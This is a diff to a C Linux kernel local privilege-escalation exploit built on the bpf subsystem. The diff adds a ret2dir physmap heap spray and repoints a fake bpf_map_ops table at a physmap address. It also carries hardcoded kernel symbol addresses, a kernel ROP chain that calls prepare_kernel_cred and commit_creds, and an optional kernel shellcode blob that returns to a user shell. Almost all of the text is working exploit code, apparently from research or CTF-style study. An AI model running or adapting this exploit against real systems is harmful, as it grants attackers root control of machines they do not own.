@@ -1,4 +1,5 @@
 #include<stdio.h>
+#include<string.h>
 #include<linux/bpf.h>
 #include<sys/syscall.h>
 #include <stdint.h>
@@ -23,6 +24,8 @@
 #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00985
 #define PREPARE_KERNEL_CRED 0xffffffff81082600
 #define COMMIT_CREDS 0xffffffff81082350
+#define PHYSMAP 0xffff888001e0e000
+//#define PHYSMAP_EXEC 1
 
 typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
@@ -60,6 +63,7 @@ void save_status()
             "pushf;"
             "pop user_rflags;"
             );
+    printf("user_cs=0x%x, user_ss=0x%x, user_sp=0x%x, user_rflags=0x%x, shell=%p\n", user_cs, user_sp, user_sp, user_rflags, shell);
 }
 
 void setupRop(uint64_t *value) {
@@ -78,8 +82,10 @@ void setupRop(uint64_t *value) {
 	*(value + 4) = 0; 
 	*(value + 5) = 0; 
 	printf("[+] set fake bpf_map_ops table.\n");
-	*(value + 6) = fake_ops;
+	//*(value + 6) = fake_ops;
+	*(value + 6) = PHYSMAP;
 
+#ifndef PHYSMAP_EXEC
 	printf("[+] set kernel rop.\n");
 	if((fake_rsp = mmap((void *)(FAKE_RSP-0x7f8),0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0))==MAP_FAILED){
         	perror("fake_rsp mmap failed!");
@@ -153,9 +159,62 @@ void setupRop(uint64_t *value) {
 		user_ss 	
 	};
 	memcpy((void*)(fake_rsp + 0x7f8), rop, sizeof(rop));
+#endif
+}
+
+#define spray_times 32*32*32/8
+#define SIZE 1024*4    //4k
+
+void 
+ret2dir() {
+	//size_t slab_addr = 0xffff8880056eec00 & 0xffffffffff000000;
+	//printf("[+] slab addr: %p\n", slab_addr);
+	void *spray[spray_times];
+	int i = 0, j = 0;
+	void *mp;
+	uint64_t xchg_eax_esp_addr = XCHG_EAX_ESP;
+	for(i=0;i<spray_times;i++){    //16k * 1024 = 16M
+        	if((mp = mmap(NULL,SIZE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0))==MAP_FAILED){
+        		perror("mmap failed!");
+        		exit(0);
+		}
+#ifdef PHYSMAP_EXEC
+		uint64_t physmap = (uint64_t*)PHYSMAP+0x20;
+		memcpy((uint64_t*)mp+2, &physmap,8);
+/* kernel shellcode
+ * //mov cr4,0x6f0
+ * //mov rdi,cr3
+ * //or rdi,0x1000
+ * //mov cr3,rdi
+ * mov rdi,0x0
+ * call 0xffffffff81082600
+ * call 0xffffffff81082350
+ * push dword 0x821fb7b0
+ * push dword 0x821fb7b0
+ * push dword 0x206
+ * push dword 0x33
+ * push dword 0x40134e
+ * swapgs
+ * iretq
+ */
+		const unsigned char shellcode[] ="\x00\x00\x00\x00\xbf\x81\x08\x25\xfc\xe8\x81\x08\x23\x4c\xe8\x82\x1f\xb7\xb0\x68\x82\x1f\xb7\xb0\x68\x00\x00\x02\x06\x68\x33\x6a\x00\x40\x13\x4e\x68\xf8\x01\x0f\xcf\x48";
+		memcpy((uint64_t *)mp+0x20, shellcode, sizeof(shellcode));
+#else
+		for(j=0;j<0x3;j++) {
+        	    memcpy((uint64_t *)mp+j, &xchg_eax_esp_addr, 8);
+        	}
+#endif
+		spray[i] = mp;          // record mmap addr
+		//printf("[+] spray heap %d's addr: %p\n", i+1, mp);
+	}
+	printf("[+] spray size: 0x%x\n",spray_times*SIZE);
+
+	// use gdb's find command to search phismap addr. e.g. find /g /10 0xffff888001e0e000,0xffffc87fffffffff,(long long int)0xffffffff8100e7f8
+	printf("[+] physmap addr: %p\n", PHYSMAP);
 }
 
 int main() {
+	ret2dir();
 	union bpf_attr *attr = (union bpf_attr*)malloc(sizeof(union bpf_attr));
 	printf("[+] sizeof(union bpf_attr): 0x%x\n", sizeof(union bpf_attr));
 	printf("[+] sizeof(struct bpf_map): 0x%x\n", 0xc0);
